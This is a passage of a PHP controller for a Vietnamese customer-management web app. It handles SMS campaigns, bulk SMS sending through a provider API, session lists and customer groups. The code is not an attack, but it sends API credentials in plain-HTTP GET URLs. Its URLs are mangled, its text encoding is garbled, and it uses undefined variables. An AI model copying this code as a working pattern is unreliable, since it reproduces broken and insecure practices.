                $sms_campain_id_sn = (!empty($smscampain_sn) && $smscampain_sn != '') ? $smscampain_sn[0]['sms_campain_id'] : -1;
                $data = array(
                    'sms_campain_name' => $sms_campain_name_sn,
                    'sms_id' => $selectedTemp,
                    'smsmail_group_id' => -1,
                    'send_minutes' => $postMinutes,
                    'send_hours' => $postHours,
                    'send_month' => $postMonths,
                    'send_day_of_month' => $postDays,
                    'send_day_of_week' => $postDaysOfWeek,
                    'iterative_time' => 1,
                    'active' => 1,
                );
                $this->Customer->update_sms_campain($data, $sms_campain_id_sn);
                #add cronjob
                # if($sms_campain_id_sn == -1 );
                # {
                # $command = $postMinutes.' '.$postHours.' '.$postDays.' '.$postMonths.' '.$postDaysOfWeek.'  php '.FCPATH.'index.php Cronjob do_send_mail '.$mail_campain_id_sn;
                # $this->crontabs->add_jobs($command);
                # }

            }
            if (!empty($this->input->post('chk_temp_for_no')) && $this->input->post('chk_temp_for_no') == 1) {
                $sms_campain_name_no = 'no';
                $smscampain_no = $this->Customer->get_all_sms_campain(array('name' => $sms_campain_name_no));

                $sms_campain_id_no = (!empty($smscampain_no) && $smscampain_no != '') ? $smscampain_no[0]['sms_campain_id'] : -1;
                $data = array(
                    'sms_campain_name' => $sms_campain_name_no,
                    'sms_id' => $selectedTemp,
                    'smsmail_group_id' => -2,
                    'send_minutes' => $postMinutes,
                    'send_hours' => $postHours,
                    'send_month' => $postMonths,
                    'send_day_of_month' => $postDays,
                    'send_day_of_week' => $postDaysOfWeek,
                    'iterative_time' => 1,
                    'active' => 1,
                );
                $this->Customer->update_sms_campain($data, $sms_campain_id_no);

            }

            if ($id == -1) {
                echo(json_encode(array('success' => true, 'message' => lang('customers_sms_msg_new') . ' (' . $sms_data['title'] . ')' . lang('customers_sms_msg_success') . ' !', 'redirect' => $redirect)));
            } else {   #previous customer
                echo(json_encode(array('success' => true, 'message' => lang('customers_sms_msg_update') . ' (' . $sms_data['title'] . ') ' . lang('customers_sms_msg_success') . ' !', 'redirect' => $redirect)));
            }
        } else {   #failure
            echo json_encode(array('success' => false, 'message' => lang('customers_sms_msg_error'), 'id' => -1));
        }
    }

    function sms_template_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_sms_template(array('sms_id' => $post['items']));
            for ($i = 0; $i < count($post['items']); $i++) {
                #delete active cron campaign
                $sms_campains = $this->Customer->get_all_sms_campain(array('sms_id' => $post['items'][$i]));
                foreach ($sms_campains as $sms_campain) {
                    $sms_campain_id = $sms_campain['sms_campain_id'];
                    $minutes = $sms_campain['send_minutes'];
                    $hours = $sms_campain['send_hours'];
                    $month = $sms_campain['send_month'];
                    $dayOfMonth = $sms_campain['send_day_of_month'];
                    $dayOfWeek = $sms_campain['send_day_of_week'];
                    $active = $sms_campain['active'];
                    if ($active == 1) {
                        if ($minutes != '*' && $hours == '') {
                            $minutes = '*/' . $postMinutes;
                        }


                    }

                }

            }
            $this->Customer->delete_sms_campain(array('sms_id' => $post['items']));

            $response = array('flag' => 'true', 'msg' => 'Bạn đã thao tác thành công.');
            echo json_encode($response);
        }
    }

    function suggest_sms()
    {
        $suggestions = $this->Customer->get_search_suggestions_sms($this->input->get('term'), 100);
        echo json_encode($suggestions);
    }

    function clear_state_sms()
    {
        redirect('customers/manage_sms');
    }

    function send_sms()
    {
        $sms_to_send = $this->input->post('ids');
        $data['list_sms'] = $this->Customer->get_all_sms();
        $this->load->view("customers/send_sms", $data);
    }

    function get_number_sms()
    {
        $max_id_sms = $this->Customer->get_table_number_sms();
        $sms = $this->Customer->get_info_id_max_of_table_number_sms($max_id_sms['id']);
        echo json_encode(array("quantity_sms" => $sms['quantity_sms']));
    }

    function do_send_sms()
    {
        $check = $this->input->get("type_send");
        $customer_ids = $this->input->post('customer_ids');
        $sms_id = $this->input->post('sms_id');
        $info_sms = $this->Customer->get_info_sms($sms_id);
        $message = $info_sms->message;

        $max_id_table_number_sms = $this->Customer->get_table_number_sms();
        $info_max_id = $this->Customer->get_info_id_max_of_table_number_sms($max_id_table_number_sms['id']);
        if ($info_max_id['quantity_sms'] > 0) {     # = null
            if ($check > 0) {
                if (isset($_SESSION['sms_tmp']) && $_SESSION['sms_tmp'] != NULL) {
                    $this->update_info_list_tmp($_SESSION['sms_tmp']);
                    foreach ($_SESSION['sms_tmp'] as $person_data) {
                        $id_cus = $person_data['person_id'];
                        $number_sms++;
                        $new_keyword = rand(100000, 999999);
                        $new_message = preg_replace('/\[[a-zA-Z]{2,6}\]/', $new_keyword, $message);
                        $info_cus = $this->Customer->get_info_person_by_id($id_cus);
                        #check numberfone
                        if (!isset($info_cus['phone_number']) || $info_cus['phone_number'] == '') continue;
                        $mobile = '84' . substr($info_cus['phone_number'], 1, strlen($info_cus['phone_number']));

                        $getdata = http_build_query(array(
                            'username' => $this->config->item('config_sms_user'),
                            'password' => $this->config->item('config_sms_pass'),
                            'source_addr' => $this->config->item('config_sms_brand_name'),
                            'dest_addr' => $mobile,
                            'message' => $new_message,
                        ));
                        $opts = array(
                            'http' => array(
                                'method' => 'GET',
                                'content' => $getdata
                            )
                        );
                        $context = stream_context_create($opts);
                        $result = file_get_contents('http:  #sms.vnet.vn:8082/api/sent?' . $getdata, false, $context);
                        sleep(1);
                        if ($result) {
                            $data_history = array(
                                'person_id' => $id_cus,
                                'employee_id' => $this->session->userdata('person_id'),
                                'title' => $info_sms->title,
                                'content' => $message,
                                'time' => date('Y-m-d H:i:s'),
                                'status' => 1,
                            );
                            $this->Customer->add_sms_history($data_history);

                            $data_insert = array(
                                'id_cus' => $id_cus,
                                'mobile' => $mobile,
                                'content_message' => $new_message,
                                'equals' => $result,
                                'date_send' => date('Y-m-d H:i:s'),
                            );
                            $this->Customer->save_message($data_insert);
                            if ($result > 0) {
                                echo json_encode(array("success" => true, "message" => 'Ä?Ã£ gá»­i thÃ nh cÃ´ng khÃ¡c hÃ ng'));
                                $this->delete_customer_from_list_sms($id_cus);
                                $data_update_table_number_sms = array(
                                    'quantity_sms' => ($info_max_id['quantity_sms'] - $info_sms->number_message),
                                );
                                $this->Customer->update_number_sms($max_id_table_number_sms['id'], $data_update_table_number_sms);
                                $this->Customer->update_month_sms($month_data);
                            }
                            $is_success = true;
                        } else {
                            echo json_encode(array('success' => true, 'message' => lang('customers_sms_msg_error_send')));
                        }
                    }
                }
            } else {
                foreach ($customer_ids as $id_cus) {
                    $info_cus = $this->Customer->get_info($id_cus);
                    $mobile = '84' . substr($info_cus->phone_number, 1, strlen($info_cus->phone_number));
                    $getdata = http_build_query(array(
                        'username' => $this->config->item('config_sms_user'),
                        'password' => $this->config->item('config_sms_pass'),
                        'source_addr' => $this->config->item('config_sms_brand_name'),
                        'dest_addr' => $mobile,
                        'message' => $message,
                    ));
                    $opts = array(
                        'http' => array(
                            'method' => 'GET',
                            'content' => $getdata
                        )
                    );
                    $context = stream_context_create($opts);
                    $result = file_get_contents('http:  #sms.vnet.vn:8082/api/sent?' . $getdata, false, $context);
                    if ($result) {
                        $data_history = array(
                            'person_id' => $id_cus,
                            'employee_id' => $this->session->userdata('person_id'),
                            'title' => $info_sms->title,
                            'content' => $message,
                            'time' => date('Y-m-d H:i:s'),
                            'status' => 1,
                        );
                        $this->Customer->add_sms_history($data_history);

                        $data_insert = array(
                            'id_cus' => $id_cus,
                            'mobile' => $mobile,
                            'content_message' => $message,
                            'equals' => $result,
                            'date_send' => date('Y-m-d H:i:s'),
                        );
                        $this->Customer->save_message($data_insert);
                        if ($result > 0) {
                            $data_update_table_number_sms = array(
                                'quantity_sms' => ($info_max_id['quantity_sms'] - $info_sms->number_message),
                            );
                            $this->Customer->update_number_sms($max_id_table_number_sms['id'], $data_update_table_number_sms);
                        }
                        echo json_encode(array("success" => true, "message" => lang('customers_sms_send_sms_success')));
                    } else {
                        echo json_encode(array("success" => false, "message" => lang('customers_sms_send_sms_unsuccess')));
                    }
                }
            }
        } else {
            echo json_encode(array("success" => false, "message" => lang('customers_sms_send_sms_not_enough')));
        }
    }

    function do_send_sms_list()
    {

        $sms_id = $this->input->post('sms_id');

        $info_sms = $this->Customer->get_info_sms($sms_id);
        $message = $info_sms->message;

        $max_id_table_number_sms = $this->Customer->get_table_number_sms();
        $info_max_id = $this->Customer->get_info_id_max_of_table_number_sms($max_id_table_number_sms['id']);
        if ($info_max_id['quantity_sms'] > 0) {     # = null
            $number_sms = 0;
            if (isset($_SESSION['sms_mail']) && $_SESSION['sms_mail'] != NULL) {
                foreach ($_SESSION['sms_mail'] as $person_data) {

                    $id_cus = $person_data['person_id'];
                    $number_sms++;
                    $new_keyword = rand(100000, 999999);
                    $new_message = preg_replace('/\[[a-zA-Z]{2,6}\]/', $new_keyword, $message);
                    $info_cus = $this->Customer->get_info_person_by_id($id_cus);
                    #check numberfone
                    if (!isset($info_cus['phone_number']) || $info_cus['phone_number'] == '') continue;
                    $mobile = '84' . substr($info_cus['phone_number'], 1, strlen($info_cus['phone_number']));

                    $getdata = http_build_query(array(
                        'username' => $this->config->item('config_sms_user'),
                        'password' => $this->config->item('config_sms_pass'),
                        'source_addr' => $this->config->item('config_sms_brand_name'),
                        'dest_addr' => $mobile,
                        'message' => $new_message,
                    ));
                    $opts = array(
                        'http' => array(
                            'method' => 'GET',
                            'content' => $getdata
                        )
                    );
                    $context = stream_context_create($opts);
                    $result = file_get_contents('http:  #sms.vnet.vn:8082/api/sent?' . $getdata, false, $context);
                    sleep(1);
                    if ($result) {
                        $data_insert = array(
                            'id_cus' => $id_cus,
                            'mobile' => $mobile,
                            'content_message' => $new_message,
                            'equals' => $result,
                            'date_send' => date('Y-m-d H:i:s'),
                        );
                        $this->Customer->save_message($data_insert);
                        if ($result > 0) {
                            echo json_encode(array("success" => true, "message" => 'Ä?Ã£ gá»­i thÃ nh cÃ´ng khÃ¡c hÃ ng'));
                            $this->delete_customer_from_list_sms_mail($id_cus);
                            $data_update_table_number_sms = array(
                                'quantity_sms' => ($info_max_id['quantity_sms'] - $info_sms->number_message),
                            );
                            $this->Customer->update_number_sms($max_id_table_number_sms['id'], $data_update_table_number_sms);
                        }
                        $is_success = true;
                    } else {
                        echo json_encode(array('success' => true, 'message' => lang('customers_sms_msg_error_send')));
                    }
                }
            }   #end if

            echo(json_encode(array('success' => true, 'message' => lang('customers_mail_send_success'))));
            redirect('customers/index?send_all=1');
        } else {
            echo(json_encode(array('success' => true, 'message' => lang('customers_mail_send_success'))));
            redirect('customers/index?send_all=1');
            echo json_encode(array("success" => false, "message" => lang('customers_sms_send_sms_not_enough')));
        }

    }

    function manage_sms_tmp()
    {
        $config['total_rows'] = count($_SESSION['sms_tmp']);
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['base_url'] = site_url('customers/sorting_sms');
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['manage_table'] = get_customer_manage_table($_SESSION['sms_tmp'], $this);
        $this->load->view("customers/manage_sms_tmp", $data);
    }

    function delete_sms_tmp_all()
    {
        unset($_SESSION['sms_tmp']);
        echo json_encode(array('success' => true, 'message' => ' Ä?Ã£ xÃ³a! SMS!'));
    }

    #Xóa Session
    function delete_tmp_all()
    {
        if ($this->input->post('tempt') == 'groupSMSEmail') {
            unset($_SESSION['sms_mail_update']);
        } else {
            unset($_SESSION['sms_tmp']);
            unset($_SESSION['mail']);
            unset($_SESSION['sms_mail']);
        }

        echo json_encode(array('success' => true, 'message' => ' Ä?Ã£ xÃ³a thÃ nh cÃ´ng'));
    }

    function delete_sms_tmp_id()
    {
        $sms_to_delete = $this->input->post('ids');
        if (in_array($sms_to_delete, $_SESSION['sms_tmp'][$sms_to_delete])) {
            unset($_SESSION['sms_tmp'][$sms_to_delete]);
            echo json_encode(array('success' => true, 'message' => ' XÃ³a khá»?i danh sÃ¡ch táº¡m thÃ nh cÃ´ng!'));
        } else {
            echo json_encode(array('success' => false, 'message' => 'Lá»—i! KhÃ´ng xÃ³a Ä‘Æ°á»£c, vui lÃ²ng thá»­ láº¡i!'));
        }
    }

    function delete_sms_mail_id()
    {
        $sms_mail_to_delete = $this->input->post('ids');
        if (in_array($sms_mail_to_delete, $_SESSION['sms_mail'][$sms_mail_to_delete])) {
            unset($_SESSION['sms_mail'][$sms_mail_to_delete]);
            echo json_encode(array('success' => true, 'message' => ' XÃ³a khá»?i danh sÃ¡ch táº¡m thÃ nh cÃ´ng'));
        } else {
            echo json_encode(array('success' => true, 'message' => ' Lá»—i! KhÃ´ng xÃ³a Ä‘Æ°á»£c, vui lÃ²ng thá»­ láº¡i!'));
        }
    }

    #ckeck sms
    function check_one_sms_id($ids = '')
    {
        if (in_array($ids, $_SESSION['sms_mail'][$ids])) {
            if ($_SESSION['sms_mail'][$ids]['send_sms'] == 0) {
                $_SESSION['sms_mail'][$ids]['send_sms'] = 1;
            } else {
                $_SESSION['sms_mail'][$ids]['send_sms'] = 0;
            }
        }
    }

    #uncheck email
    function delete_sms_mail_check_id($item_ids = '')
    {
        $item_ids = explode('~', $item_ids);
        foreach ($item_ids as $v) {
            if (array_key_exists($v, $_SESSION['sms_mail'])) {

                $_SESSION['sms_mail'][$v]['send_mail'] = 1;
            }
        }
    }

    #Bá»? check
    function delete_sms_mail_uncheck_id($item_ids = '')
    {
        $item_ids = explode('~', $item_ids);
        foreach ($item_ids as $v) {
            if (array_key_exists($v, $_SESSION['sms_mail'])) {

                $_SESSION['sms_mail'][$v]['send_mail'] = 0;
            }
        }
    }

    #sms
    #uncheck sms
    function delete_sms_mail_check_sms_id($item_ids = '')
    {
        $item_ids = explode('~', $item_ids);
        foreach ($item_ids as $v) {
            if (array_key_exists($v, $_SESSION['sms_mail'])) {

                $_SESSION['sms_mail'][$v]['send_sms'] = 1;
            }
        }
    }

    #Bá»? check sms
    function delete_sms_mail_uncheck_sms_id($item_ids = '')
    {
        $item_ids = explode('~', $item_ids);
        foreach ($item_ids as $v) {
            if (array_key_exists($v, $_SESSION['sms_mail'])) {

                $_SESSION['sms_mail'][$v]['send_sms'] = 0;
            }
        }
    }

    #xÃ³a check send mail
    function delete_sms_mail_id_uncheck()
    {
        $sms_mail_to_uncheck = $this->input->post('ids');
        $_SESSION['sms_mail'][$sms_mail_to_uncheck]['send_mail'] = 0;
    }

    function delete_mail_tmp_all()
    {
        unset($_SESSION['mail']);
        echo json_encode(array('success' => true, 'message' => ' Ä?Ã£ xÃ³a! E-Mail!'));
    }

    function delete_mail_tmp_id()
    {
        $mail_to_delete = $this->input->post('ids');
        if (in_array($mail_to_delete, $_SESSION['mail'][$mail_to_delete])) {
            unset($_SESSION['mail'][$mail_to_delete]);
            echo json_encode(array('success' => true, 'message' => ' XÃ³a khá»?i danh sÃ¡ch táº¡m thÃ nh cÃ´ng!'));
        } else {
            echo json_encode(array('success' => false, 'message' => 'Lá»—i! KhÃ´ng xÃ³a Ä‘Æ°á»£c, vui lÃ²ng thá»­ láº¡i!'));
        }
    }

    function mail_checkbox()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $customer_id = $post['customer_id'];
            if (!isset($_SESSION['sms_mail'][$customer_id])) {
                if ($post['action'] == 'check') {
                    $customer_info = $this->Customer->get_information($customer_id);
                    $tmp = array(
                        'person_id' => $customer_id,
                        'name' => $customer_info['first_name'] . ' ' . $customer_info['last_name'],
                        'email' => $customer_info['email'],
                        'phone_number' => $customer_info['phone_number'],
                        'send_mail' => 1,
                        'send_sms' => 0,
                    );

                    $_SESSION['sms_mail'][$customer_id] = $tmp;
                }

            } else {
                if ($post['action'] == 'check') {
                    $_SESSION['sms_mail'][$customer_id]['send_mail'] = 1;
                } else
                $_SESSION['sms_mail'][$customer_id]['send_mail'] = 0;
            }

        }
    }

    function send_sms_list()
    {
        $data['list_sms'] = $this->Customer->get_all_sms();
        $this->load->view("customers/send_sms_list", $data);
    }
    #------------------------------------------------------------------------------------------
    #
    #  GROUPS SMS EMAIL OF CUSTOMER
    #===========================================================================================


    /**
     * Show group sms email add form
     *
     * Show modal, users can add customer to a new or existing group from customer view
     *
     * @return  void
     */

    function create_group_form()
    {
        $data['session'] = ($this->input->post('session_SMS_email') != '') ? $this->input->post('session_SMS_email') : 'sms_mail';
        $data['list_customer_group'] = $this->Customer->get_all_customer_groups($searchCondition = array('name' => '', 'order_col' => 'smsmail_group_id', 'order_dir' => 'asc'), 10000, 0);
        $this->load->view("customers/group_SMS_Email/create_group_sms_email", $data);
    }
    # --------------------------------------------------------------------


    /**
     * Save group
     *
     * Update, insert group
     *
     * @return void
     */
    function save_group_customer()
    {
        $this->check_action_permission('add_update');
        $post = $this->input->post();
        if ($post) {
            #get groupp id from  select box in modal in customers main view

            if ($this->input->post('slbx') != 0) {
                $result = (string)$this->input->post('slbx');
            }

            #check if is update or create
            $smsmail_group_id = $this->uri->segment(3);

            if ($smsmail_group_id > 0) {
                $data = array(
                    'name' => $this->input->post('txt_group_name'),
                    'description' => $this->input->post('txt_group_description')
                );
                $this->Customer->_update_smsEmailGroup($data, $smsmail_group_id);
                $result = $smsmail_group_id;
            } else {
                #Insert from customer form or update group sms email form
                if ($this->input->post('txt_group_name') != '') {
                    $data = array(
                        'name' => $this->input->post('txt_group_name'),
                        'description' => $this->input->post('txt_group_description')
                    );
                    $result = $this->Customer->_update_smsEmailGroup($data, false);
                }
            }


            #start insert customer to the group
            if ($result != false) {


                if ($this->input->post('items') == '') {

                    # insert  from temp list
                    if ($this->input->post('session') != '') {
                        # determine session data is used for insert
                        $session = $this->input->post('session');
                        if (isset($_SESSION[$session]) && is_array($_SESSION[$session]) && count($_SESSION[$session]) > 0) {

                            foreach ($_SESSION[$session] as $val) {
                                # check exist or not , if exist then donot insert
                                if (!$this->Customer->check_exist_customer_smsEmail($val['person_id'], $result)) {       # insert new row
                                    $data = array(
                                        'person_id' => $val['person_id'],
                                        'smsmail_group_id' => $result
                                    );
                                    $this->Customer->_insert_smsEmail($data);
                                }

                            }

                        }

                    }
                    $response = array('flag' => 'true', 'msg' => lang('common_success'), 'smsmail_group_id' => $result);
                } else {
                    #insert with post id customer
                    $id = $this->input->post('items');
                    for ($i = 0; $i < count($id); $i++) {
                        # check exist or not , if exist then donot insert
                        if (!$this->Customer->check_exist_customer_smsEmail($id[$i], $result)) {
                            $data = array(
                                'person_id' => $id[$i],
                                'smsmail_group_id' => $result
                            );
                            $this->Customer->_insert_smsEmail($data);
                        }

                    }
                    $response = array('flag' => 'true', 'msg' => lang('common_success'), 'smsmail_group_id' => $result);
                }

            } else {
                $response = array('flag' => 'false', 'msg' => lang('common_error'));
            }

        }
        echo json_encode($response);

    }
    # --------------------------------------------------------------------


    /**
     * Manage group sms email
     *
     * Show name, description and how many customer in group
     *
     * @return void
     */
    public function manage_group_send_SMS_email()
    {
        # Search condition
        $searchCondition = array(
            'name' => ($this->input->post('search') != '') ? $this->input->post('search') : '',
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : 'smsmail_group_id',
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : 'asc',
        );

        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_group_send_SMS_email';
        $config['total_rows'] = $this->Customer->count_all_customer_groups($searchCondition);
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 3;
        $config['use_page_numbers'] = TRUE;

        $page = $this->uri->segment(3, 1);
        if ($page > 0) {
            $page = ($page - 1) * $config['per_page'];
        }

        $this->pagination->initialize($config);

        $data['pagination'] = $this->pagination->my_Create_Links();
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['results'] = $this->Customer->get_all_customer_groups($searchCondition, $config['per_page'], $page);

        # count the number of customer in group, show in view
        foreach ($data['results'] as $customers_in_group) {
            $data['customers_in_group'][$customers_in_group->smsmail_group_id] = $this->Customer->count_customer_in_smsEmail_group($searchCondition = array('name' => ''), $customers_in_group->smsmail_group_id);
        }

        # get if pagination is true else show the master view
        if ($this->uri->segment(4) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/group_SMS_Email/manage_group_send_SMS_mail_tbody", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/group_SMS_Email/manage_group_send_SMS_mail", $data);
        }

    }
    # --------------------------------------------------------------------


    /**
     * Delete group sms email
     *
     * @return void
     */

    function delete_group_send_SMS_email()
    {
        $post = $this->input->post();
        if (!empty($post)) {

            # delete with array of id
            $this->Customer->_delete_smsEmailGroup($post['items']);
            $this->Customer->_delete_smsEmail(array('smsmail_group_id' => $post['items']));
            $this->Customer->delete_mail_campain(array('smsmail_group_id' => $post['items']));
            $this->Customer->delete_sms_campain(array('smsmail_group_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => lang('common_success'));
            echo json_encode($response);
        }
    }
    # --------------------------------------------------------------------


    /**
     * Manage group sms email detail
     *
     * Show information (name, email, phone) about customer in group
     * @return void
     */
    function manage_group_SMS_email_detail()

    {

        $smsmail_group_id = $this->uri->segment(3);
        $searchCondition_customer_groups = array('name' => '', 'id' => $smsmail_group_id, 'order_col' => 'smsmail_group_id', 'order_dir' => 'asc');
        $customer_detail = $this->Customer->get_all_customer_groups($searchCondition_customer_groups, 1, 0);


        # Search condition
        $searchCondition = array(
            'name' => $this->input->post('search') != '' ? $this->input->post('search') : '',
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : 'id',
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : 'asc',
        );


        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_group_SMS_email_detail/' . $smsmail_group_id;
        $config['total_rows'] = $this->Customer->count_customer_in_smsEmail_group($searchCondition, $smsmail_group_id);
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 4;
        $config['use_page_numbers'] = TRUE;

        $page = $this->uri->segment(4, 1);
        if ($page > 0) {
            $page = ($page - 1) * $config['per_page'];
        }

        $this->pagination->initialize($config);

        $data['pagination'] = $this->pagination->my_Create_Links();
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['smsmail_group_id'] = $smsmail_group_id;
        $data['customer_detail'] = $customer_detail;
        $data['results'] = $this->Customer->get_customer_in_smsEmail_group($searchCondition, $config['per_page'], $page, $smsmail_group_id);


        # get if pagination is true else show the master view
        if ($this->uri->segment(5) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/group_SMS_Email/manage_group_SMS_mail_tbody_detail", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/group_SMS_Email/manage_group_SMS_email_detail", $data);
        }
    }
    # --------------------------------------------------------------------


    /**
     * delete group sms email detail
     * delete custome
     */
    function delete_group_SMS_email_detail()
    {
        $post = $this->input->post();

        if (!empty($post)) {
            $this->Customer->_delete_smsEmail(array('smsmail_group_id' => $post['smsmail_group_id'], 'person_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => lang('common_success'));
            echo json_encode($response);
        }
    }
    # --------------------------------------------------------------------


    /**
     * update group sms email detail view
     *
     * Insert customer to group, create new group, update name,description
     * @return void
     */
    function update_group_SMS_email()
    {

        $smsmail_group_id = $this->uri->segment(3);

        #check for insert or update (0 or !=0)
        if ($smsmail_group_id > 0) {
            $searchCondition_customer_groups = array('name' => '', 'id' => $smsmail_group_id, 'order_col' => 'smsmail_group_id', 'order_dir' => 'asc');
            $customer_detail = $this->Customer->get_all_customer_groups($searchCondition_customer_groups, 1, 0);
            $data['customer_detail'] = $customer_detail;
        } else {
            $smsmail_group_id = 0;
        }

        # Save search condition
        $searchDefault = array(
            'search_text' => '',
            'order_col' => 'last_name',
            'order_dir' => 'asc'

        );


        $_SESSION['searchCondition'] = isset($_SESSION['searchCondition']) ? $_SESSION['searchCondition'] : $searchDefault;
        $searchCondition = array(
            'search_text' => isset($_POST['search']) ? $this->input->post('search') : $_SESSION['searchCondition']['search_text'],
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['searchCondition']['order_col'],
            'order_dir' => $this->input->post('order_col') ? $this->input->post('order_dir') : $_SESSION['searchCondition']['order_dir'],
        );

        #save search condition for reload page
        $_SESSION['searchCondition'] = $searchCondition;

        $data['total_rows_send'] = isset($_SESSION['sms_mail_update']) ? count($_SESSION['sms_mail_update']) : 0;

        $config['base_url'] = base_url() . 'customers/update_group_SMS_email/' . $smsmail_group_id;
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['use_page_numbers'] = TRUE;
        $config['uri_segment'] = 4;


        $data['smsmail_group_id'] = $smsmail_group_id;
        $data['per_page'] = $config['per_page'];
        $data['baseUrl'] = $config['base_url'];
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();


        $page = $this->uri->segment(4, 1);

        if ($page > 0) {
            $page = ($page - 1) * $config['per_page'];
        }


        # show tempt list
        if ($this->input->post('tempt') == '1') {

            if (isset($_SESSION['sms_mail_update'])) {
                $data['results'] = array_slice($_SESSION['sms_mail_update'], $page, $config['per_page']);
            } else {
                $data['results'] = lang('customers_no_sms');
            }
            $data['type'] = 'tempt';
            $config['total_rows'] = $data['total_rows_send'];
            $data['total_rows'] = $config['total_rows'];
            $this->pagination->initialize($config);
            $data['pagination'] = $this->pagination->my_Create_Links();

        } else {
            # all customer list
            if ($_SESSION['searchCondition']['search_text'] != '') {

                $config['total_rows'] = $this->Customer->search_count_all($_SESSION['searchCondition']['search_text']);
                $data['results'] = $this->Customer->search($_SESSION['searchCondition']['search_text'], $config['per_page'], $page, $_SESSION['searchCondition']['order_col'], $_SESSION['searchCondition']['order_dir'])->result_array();
            } else {
                $arrParam['page'] = $this->uri->segment(4, 1);
                $arrParam['scope_of_view'] = $this->_scopeOfView;
                $arrParam['paginator'] = array('per_page' => $config['per_page']);
                $config['total_rows'] = $this->Customer->count_all_customers($arrParam['scope_of_view']);
                $data['results'] = $this->Customer->list_item($arrParam);

            }

            $data['type'] = 'main';
            $this->pagination->initialize($config);
            $data['total_rows'] = $config['total_rows'];
            $data['pagination'] = $this->pagination->my_Create_Links();

        }


        if ($this->uri->segment(5) == 't') {
            echo json_encode(array(
                'manage_table' => $this->load->view('customers/group_SMS_Email/manage_group_send_SMS_mail_update_tbody', $data, TRUE),
                'pagination' => $this->load->view('customers/pagination_view', $data, TRUE),
                'total_row' => $data['total_rows'],
            ));

        } else {
            $this->load->view("customers/group_SMS_Email/manage_group_send_SMS_mail_update", $data);
        }

    }

    # --------------------------------------------------------------------

    function save_list_send_sms($item_ids = "")
    {
        $item_ids = explode('~', $item_ids);
        #var_dump($item_ids);die;
        foreach ($item_ids as $item) {
            $info_cus = $this->Customer->get_info_person_by_id($item);
            if (isset($_SESSION['sms_tmp'][$item])) {
                echo '1';
                continue;
            } else {
                echo '2';
                $_SESSION['sms_tmp'][$info_cus['person_id']] = array(
                    'person_id' => $item,
                    'name' => $info_cus['first_name'] . " " . $info_cus['last_name'],
                    'phone_number' => $info_cus['phone_number'],
                );
            }
        }
        redirect('customers');
    }

    function update_info_list_tmp(&$list_customer = array())
    {
        $info = '';
        if (isset($list_customer) && count($list_customer) > 0) {
            foreach ($list_customer as $person_id => $person_info) {
                $info = $this->Customer->get_info_person_by_id($person_id);
                if ($info['first_name'] . " " . $info['last_name'] != $person_info['name'])
                    $list_customer[$person_id]['name'] = $info_cus['first_name'] . " " . $info_cus['last_name'];

                if ($info['phone_number'] != $person_info['phone_number'])
                    $list_customer[$person_id]['phone_number'] = $info['phone_number'];
            }
        }
    }

    function delete_customer_from_list_sms($id)
    {
        if ($id > 0) {
            unset($_SESSION['sms_tmp'][$id]);
            return $id;
        }
        return 0;
    }

    function delete_customer_from_list_sms_mail($id)
    {
        if ($id > 0) {
            $_SESSION['sms_mail'][$id]['send_sms'] = 0;
            return $id;
        }
        return 0;
    }

    function quotes_contract()
    {
        $this->check_action_permission('manage_quote');
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $this->load->view('customers/manage_quotes_contract', $data);
    }

    function quotes_constract_store()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $_SESSION['quotes_constract_filter'] = array();
            $arrParam = array_merge($post, $this->input->get());
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);

            $config['base_url'] = base_url() . 'tasks/quotes_constract_store';
            $config['total_rows'] = $this->Customer->count_all_constract($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            #$config['per_page'] = $arrParam['paginator']['per_page'] = 1;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->constract_list($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $result = array('count' => $config['total_rows'], 'items' => $items, 'pagination' => $pagination);
            echo json_encode($result);
        }
    }

    #add new constract type
    function quotes_contract_type_view($id = -1)
    {
        $data = array('id' => $id);
        if ($id > 0) {
